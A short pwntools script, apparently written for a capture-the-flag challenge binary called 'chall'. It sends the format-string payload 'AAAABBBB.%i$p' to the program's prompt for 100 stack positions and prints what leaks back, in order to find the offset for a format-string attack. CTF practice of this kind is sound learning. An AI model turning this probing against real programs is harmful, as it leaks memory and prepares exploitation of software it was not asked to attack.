from pwn import *

context.binary = elf = ELF("./chall")
context.terminal = ['xfce4-terminal', '-e']
context.log_level = 'error'
#libc = ELF("libc.so.6")
if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        p = gdb.debug([elf.path],'''

            continue
        ''')
else:
    p = process()

for i in range(100):
    p = process()
    p.sendlineafter(b'kamu?\n',f'AAAABBBB.%{i}$p'.encode())
    #p.recvuntil(b'ini\n')
    a = p.recv().split(b'\n')[0]
    print(i,a)
    p.close()

p.interactive()